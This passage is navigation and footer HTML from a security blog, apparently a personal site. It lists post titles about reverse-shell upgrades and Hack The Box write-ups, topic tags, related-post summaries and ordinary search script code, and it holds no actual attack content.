</span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/resolute/"><div class="card-body"> <span class="timeago small" > May 24, 2020 <i class="unloaded">2020-05-24T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Resolute Writeup</h3><div class="text-muted small"><p> HTB - Resolute Overview A medium-difficulty Windows box that was fairly straightforward. Privilege escalation required going through two different users and taking advantage of Windows domain ...</p></div></div></a></div><div class="card"> <a href="/posts/monteverde/"><div class="card-body"> <span class="timeago small" > May 30, 2020 <i class="unloaded">2020-05-30T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Monteverde Writeup</h3><div class="text-muted small"><p> HTB - Monteverde Overview Short description to include any strange things to be dealt with…when there is a proper description here the website build will stop breaking. Hopefully this is enough...</p></div></div></a></div><div class="card"> <a href="/posts/nest/"><div class="card-body"> <span class="timeago small" > May 31, 2020 <i class="unloaded">2020-05-31T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Nest Writeup</h3><div class="text-muted small"><p> HTB - Nest Overview This was a fairly easy Windows box that required a bit of back-and-forth between locations and also a little bit of .NET-fu to proceed. Luckily there are tools and websites...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/upgrade-windows-shell/" class="btn btn-outline-primary" prompt="Older"><p>Upgrade a Windows reverse shell to a fully usable shell</p></a> <a href="/posts/using-github-issues-for-blog-comments/" class="btn btn-outline-primary" prompt="Newer"><p>Using GitHub Issues for Blog Comments Using utteranc.es</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
